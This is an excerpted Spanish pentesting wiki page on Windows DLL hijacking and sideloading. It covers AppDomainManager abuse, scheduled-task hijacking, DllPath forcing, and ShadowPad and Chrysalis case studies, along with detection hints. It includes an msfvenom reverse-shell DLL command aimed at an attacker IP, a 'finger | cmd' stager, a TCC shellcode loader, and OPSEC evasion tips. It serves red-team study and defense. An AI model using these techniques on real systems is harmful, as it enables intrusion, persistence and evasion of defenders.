...
- El host debe ser realmente un **managed EXE**. Triage rápido: `sigcheck -m target.exe`, `corflags target.exe` o comprobar la presencia del **CLR Runtime Header** en los metadatos PE.
...
- Esto resulta útil con binarios firmados de **Microsoft/vendor** porque el EXE de confianza permanece intacto mientras el managed assembly malicioso se ejecuta in-process.
- Si ya tienes un directorio de instalación/actualización con permisos de escritura, el hijacking de AppDomainManager puede utilizarse como **first stage**, seguido de classic DLL sideloading o reflective loading para los stages posteriores.

### AppDomainManager como downloader + bootstrap de scheduled task

Un patrón práctico de intrusión consiste en combinar el managed EXE de confianza con un `*.config` malicioso y una DLL de AppDomainManager maliciosa que actúa únicamente como un **small bootstrapper**:<sup>[[25]](#references)</sup>
...
3. El manager malicioso realiza un **path gate** (por ejemplo, solo continúa si el host EXE se está ejecutando desde `Downloads`, y solo permite que el second stage se ejecute desde `%LOCALAPPDATA%`).
...
- El host EXE firmado permanece sin cambios, por lo que un triage que solo obtiene el hash del binario principal puede no detectar el compromiso.
- Es común utilizar **anti-analysis basada en rutas**: mover el trío ZIP/EXE/DLL al Escritorio, Temp o una ruta de sandbox puede romper intencionadamente la cadena.
- La DLL de AppDomainManager del first stage puede ser pequeña y generar poco ruido mientras el implant real se descarga posteriormente.
...
- Esta técnica suele categorizarse mejor como **ejecución/persistencia mediante abuso de la configuración de .NET** que como un clásico hijacking del orden de búsqueda de DLL, aunque los operadores suelen encadenar ambos.

Puntos de detección:
- Ejecutables .NET firmados iniciados desde **rutas de extracción ZIP**, `Downloads`, `%TEMP%` u otras carpetas en las que el usuario pueda escribir, con un `<exe>.config` **ubicado junto a ellos**.
- Nuevas tareas programadas cuya acción apunta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads`, y cuyos nombres imitan actualizadores de navegadores/proveedores.
- Procesos bootstrap administrados de corta duración que descargan inmediatamente otro EXE y luego ejecutan `schtasks.exe`.
- Samples que salen prematuramente a menos que la ruta del ejecutable coincida con un directorio esperado del perfil del usuario.

### Hijacking de una tarea programada existente para volver a lanzar la cadena de sideload

Para obtener persistencia, no busques únicamente **crear una tarea nueva**. Algunos grupos de intrusión esperan hasta que un instalador legítimo cree una **tarea de actualización normal** y luego **reescriben la acción de la tarea** para que el nombre, el autor y el trigger existentes sigan resultando familiares para los defensores.
...
3. Sustituye únicamente la acción para que la tarea inicie tu **EXE host de confianza** desde un directorio de staging en el que el usuario pueda escribir; este realiza un sideload o carga mediante AppDomain del payload real.
...
> [!TIP]
> Para conocer una cadena paso a paso que combina staging HTML, configuraciones AES-CTR e implants .NET sobre DLL sideloading, revisa el workflow siguiente.
...
![Técnicas comunes - Encontrar Dlls faltantes: La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar procmon de sysinternals, configurando los 2 filtros siguientes](<../../../images/image (961).png>)

![Técnicas comunes - Encontrar Dlls faltantes: La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar procmon de sysinternals, configurando los 2 filtros siguientes](<../../../images/image (230).png>)

y mostrando únicamente la **actividad del sistema de archivos**:

![Técnicas comunes - Encontrar Dlls faltantes: y mostrando únicamente la actividad del sistema de archivos](<../../../images/image (153).png>)
...
Para escalar privilegios, busca una **DLL que un proceso privilegiado intente cargar** desde una ubicación en la que puedas escribir. Esto puede ocurrir cuando controlas un directorio buscado antes que el directorio que contiene la DLL legítima, o cuando la DLL solicitada no existe y puedes escribir en uno de los directorios buscados.
...
Las **aplicaciones de Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, respetando una secuencia concreta. El problema del DLL hijacking surge cuando se coloca estratégicamente una DLL maliciosa en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para evitarlo es garantizar que la aplicación utilice rutas absolutas al referirse a las DLLs que necesita.
...
6. Los directorios que aparecen en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada por la clave de registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.

Ese es el orden de búsqueda **predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual sube a la segunda posición. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (el valor predeterminado es habilitado).
...
3. Construye una DLL de payload (por ejemplo, una reverse shell) con cualquier exportación: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
...
```
5. Entrega el archivo comprimido en la bandeja de entrada/recurso compartido supervisado; cuando la tarea programada vuelva a iniciar el proceso, cargará la DLL maliciosa y ejecutará tu código con la cuenta de servicio.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado consiste en establecer el campo DllPath de RTL_USER_PROCESS_PARAMETERS al crear el proceso con las APIs nativas de ntdll. Al proporcionar aquí un directorio controlado por el atacante, se puede forzar a un proceso objetivo que resuelva una DLL importada por nombre (sin una ruta absoluta y sin usar los flags de carga segura) a cargar una DLL maliciosa desde ese directorio.
...
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará el DllPath proporcionado durante la resolución, lo que permitirá un sideloading fiable incluso cuando la DLL maliciosa no esté en el mismo directorio que el EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es diferente de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar o ejecutar LoadLibrary sobre una DLL por nombre (sin una ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
...
- Coloca una xmllite.dll maliciosa (que exporte las funciones requeridas o haga proxy hacia la real) en tu directorio DllPath.
- Inicia un binario firmado conocido por buscar xmllite.dll por nombre usando la técnica anterior. El loader resuelve la importación mediante el DllPath proporcionado y hace sideload de tu DLL.

Esta técnica se ha observado en la práctica para impulsar cadenas de sideloading de varias etapas: un launcher inicial deposita una DLL auxiliar, que después inicia un binario firmado por Microsoft y susceptible de hijacking con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.<sup>[[6]](#references)</sup>
...
Así funciona la cadena:<sup>[[15]](#references)[[22]](#references)</sup>
1. El EXE host se inicia y el **CLR lee `<exe>.config`**.
2. La configuración establece **`<appDomainManagerAssembly>`** y **`<appDomainManagerType>`**, de modo que el runtime instancia un `AppDomainManager` controlado por el atacante.
3. El manager malicioso obtiene **ejecución previa a `Main()`** dentro del proceso host de confianza.
...
```
Por qué es útil:
- **`<probing privatePath="."/>`** mantiene la resolución de ensamblados en el directorio de la aplicación, convirtiendo la carpeta en una superficie predecible para sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** trasladan la ejecución al código del atacante durante la inicialización del CLR, antes de que se ejecute la lógica de la aplicación legítima.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** puede permitir que una aplicación full-trust cargue ensamblados sin firmar o manipulados sin que se produzca un fallo de validación de strong-name.<sup>[[19]](#references)</sup>
...
Ideas para hunting:
- **Ejecutables .NET** firmados o legítimos que se ejecutan con archivos **`.config`** adyacentes sospechosos en ubicaciones donde el usuario tiene permisos de escritura.
...
- Cadenas de procesos padre/hijo en las que una tarea programada inicie un host .NET confiable que cargue inmediatamente ensamblados que no pertenecen al proveedor desde su propio directorio.
...
- Cuando se encuentra una **DLL que comparte su nombre con otra ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, comprueba si existen redirecciones y un manifest antes de utilizar la DLL ya cargada en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
...
En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo correctamente sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que DLL Hijacking resulta útil para [escalar desde el nivel Medium Integrity hasta High **(evitando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o desde[ **High Integrity hasta SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio sobre DLL hijacking centrado en la ejecución mediante DLL hijacking: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguie**nte secció**n** puedes encontrar algunos **códigos básicos de dll** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.
...
Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que quieres convertir en proxy y **generar una dll proxy**, o **indicar la DLL** y **generar una dll proxy**.
...
Windows Narrator.exe todavía busca al iniciarse una DLL de localization predecible y específica del idioma que puede ser hijacked para ejecutar código arbitrario y lograr persistencia.<sup>[[7]](#references)</sup>
...
```
OPSEC silence
- Un hijacking ingenuo hablará/resaltará la UI. Para permanecer silencioso, al adjuntarse enumera los hilos de Narrator, abre el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y suspéndelo con `SuspendThread`; continúa en tu propio hilo. Consulta el PoC para ver el código completo.<sup>[[8]](#references)</sup>
...
- Puedes clonar una entrada del registro de una Accessibility Tool (AT) integrada (por ejemplo, CursorIndicator), editarla para que apunte a un binario/DLL arbitrario, importarla y, después, establecer `configuration` con el nombre de esa AT. Esto actúa como proxy para ejecutar código arbitrario bajo el framework de Accessibility.
...
- **Comportamiento de búsqueda de DLL**: Intenta cargar primero `hostfxr.dll` desde su directorio de trabajo y registra "NAME NOT FOUND" si falta, lo que indica precedencia de búsqueda en el directorio local.

### Exploit Implementation

Un atacante puede colocar un stub malicioso de `hostfxr.dll` en el mismo directorio y explotar la DLL ausente para lograr la ejecución de código bajo el contexto del usuario:
```c
#include <windows.h>
...
2. Espera a que la tarea programada se ejecute a las 9:30 a. m. en el contexto del usuario actual.
...
- El usuario descarga el MSI. Una CustomAction se ejecuta silenciosamente durante la instalación mediante GUI (por ejemplo, LaunchApplication o una acción de VBScript), reconstruyendo la siguiente etapa a partir de recursos incrustados.
...
## Triadas firmadas + payloads cifrados (caso práctico de ShadowPad)
...
2. **DLL loader maliciosa** – se deposita junto al EXE con un nombre esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su único trabajo es localizar el blob cifrado, descifrarlo y mapear ShadowPad reflectivamente.
3. **Blob de payload cifrado** – a menudo se almacena como `<name>.tmp` en el mismo directorio. Después de mapear el payload descifrado en memoria, el loader elimina el archivo TMP para destruir las evidencias forenses.

Notas de tradecraft:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` original en la cabecera PE) permite que se haga pasar por un binario de Windows y conserve la firma del proveedor; por tanto, replica el hábito de Ink Dragon de depositar binarios con aspecto de `conhost.exe` que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de los controles de allowlisting solo necesitan que tu DLL maliciosa se encuentre junto a él. Céntrate en personalizar la DLL loader; normalmente el proceso padre firmado puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y sea escribible para poder poner el archivo a cero después del mapeo. Mantén el directorio escribible hasta que se cargue el payload; una vez en memoria, el archivo TMP puede eliminarse de forma segura para OPSEC.

### LOLBAS stager + cadena de sideloading de un archivo por etapas (finger → tar/curl → WMI)
...
```
- `finger user@host` extrae texto desde TCP/79; `| cmd` ejecuta la respuesta del servidor, lo que permite a los operadores rotar el servidor de la segunda etapa desde el lado del servidor.

- **Descarga/extracción integrada:** Descarga un archivo con una extensión benigna, descomprímelo y prepara el objetivo del sideload junto con la DLL en una carpeta `%LocalAppData%` aleatoria:
...
- **Ejecución mediante WMI/CIM:** Inicia el EXE mediante WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL colocada junto a él:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binarios que prefieren DLLs locales (p. ej., `intelbq.exe`, `nearby_share.exe`); el payload (p. ej., Remcos) se ejecuta bajo el nombre de confianza.
...
## Caso práctico: dropper NSIS + sideload del Submission Wizard de Bitdefender (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización de confianza para entregar un dropper empaquetado con NSIS que preparaba un DLL sideload junto con payloads completamente en memoria.<sup>[[13]](#references)</sup>

Flujo de tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deposita un Submission Wizard de Bitdefender renombrado `BluetoothService.exe`, una `log.dll` maliciosa y un blob cifrado `BluetoothService`; después inicia el EXE.
- El EXE host importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob mediante mmap; `LogWrite` lo descifra con un stream personalizado basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, con material de clave derivado de un hash anterior), sobrescribe el buffer con el shellcode en texto plano, libera los temporales y salta a él.
- Para evitar una IAT, el loader resuelve las APIs aplicando hashing a los nombres de los exports mediante **FNV-1a basis 0x811C9DC5 + prime 0x100019**, y después aplica un avalanche de estilo Murmur (**0x85EBCA6B**) para compararlo con hashes objetivo con salt.

Shellcode principal (Chrysalis)
- Descifra un módulo principal similar a un PE repitiendo operaciones de suma/XOR/resta con la clave `gQ2JR&9;` durante cinco pasadas; después carga dinámicamente `Kernel32.dll` → `GetProcAddress` para finalizar la resolución de imports.
- Reconstruye las cadenas de nombres de DLL en tiempo de ejecución mediante transformaciones de rotación de bits/XOR por carácter; después carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, analiza cada tabla de exports en bloques de 4 bytes con mixing de estilo Murmur y solo recurre a `GetProcAddress` si no encuentra el hash.
...
- Los beacons construyen un perfil de host delimitado por puntos, anteponen el tag `4Q` y después lo cifran con RC4 usando la clave `vAuig34%^325hGV` antes de `HttpSendRequestA` mediante HTTPS. Las respuestas se descifran con RC4 y se distribuyen mediante un switch de tags (`4T` shell, `4V` ejecución de procesos, `4W/4X` escritura de archivos, `4Y` lectura/exfil, `4\\` desinstalación, `4` enumeración de unidades/archivos + casos de transferencia por fragmentos).
- El modo de ejecución está controlado por argumentos CLI: sin argumentos = instala persistencia (servicio/clave Run) apuntando a `-i`; `-i` vuelve a iniciar el proceso con `-k`; `-k` omite la instalación y ejecuta el payload.

Loader alternativo observado
- La misma intrusión depositó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` junto a él. El código fuente C proporcionado por el atacante contenía shellcode, se compilaba y se ejecutaba en memoria sin tocar el disco con un PE. Reprodúcelo con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compilación y ejecución basada en TCC importó `Wininet.dll` en runtime y descargó un shellcode de segunda etapa desde una URL codificada, proporcionando un loader flexible que se hace pasar por una ejecución del compilador.

## Sideloading de DLL mediante un host firmado con proxying de exports + aparcamiento del hilo del host

Algunas cadenas de DLL sideloading incorporan **ingeniería de estabilidad** para que el host legítimo permanezca activo el tiempo suficiente para cargar limpiamente las etapas posteriores, en lugar de bloquearse después de cargar la DLL maliciosa.<sup>[[11]](#references)</sup>

Patrón observado
- Colocar un EXE de confianza junto a una DLL maliciosa usando el nombre de dependencia esperado, como `version.dll`.
- La DLL maliciosa hace **proxying de todos los exports esperados** hacia la DLL de sistema real (por ejemplo, `%SystemRoot%\\System32\\version.dll`), de modo que la resolución de imports siga funcionando y el proceso host continúe operativo.
- Después de cargarse, la DLL maliciosa **parchea el entry point del host** para que el hilo principal entre en un bucle infinito de `Sleep` en lugar de salir o ejecutar rutas de código que terminarían el proceso.
...
- Aparcar el hilo principal en `Sleep(INFINITE)` es una forma sencilla de mantener el proceso firmado residente mientras el loader realiza el descifrado, el staging o el bootstrap de red en un worker thread.
- Buscar únicamente una `DllMain` sospechosa puede hacer que se pase por alto este patrón si el comportamiento interesante ocurre después de parchear el entry point del host y de iniciar un hilo secundario.
...
5. Descifrar el nombre o la configuración de la DLL de la siguiente etapa y llamar a `LoadLibrary` o hacer manual-map del payload.

Indicadores defensivos
- Procesos firmados que cargan `version.dll` u otras bibliotecas comunes similares desde su propio directorio de aplicación en lugar de `System32`.
- Parches de memoria en el entry point del proceso poco después de cargar la imagen, especialmente saltos o llamadas redirigidos a `Sleep`/`SleepEx`.
- Hilos creados por una DLL proxy que llaman inmediatamente a `LoadLibrary` sobre una segunda DLL con un nombre descifrado.
- DLL proxy con todos los exports, colocadas junto a ejecutables de proveedores dentro de directorios de staging modificables, como `ProgramData`, `%TEMP%` o rutas de archivos descomprimidos.
...
- [13] [Rapid7 – El backdoor Chrysalis: análisis profundo del toolkit de Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → cadena de DLL hijacking](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
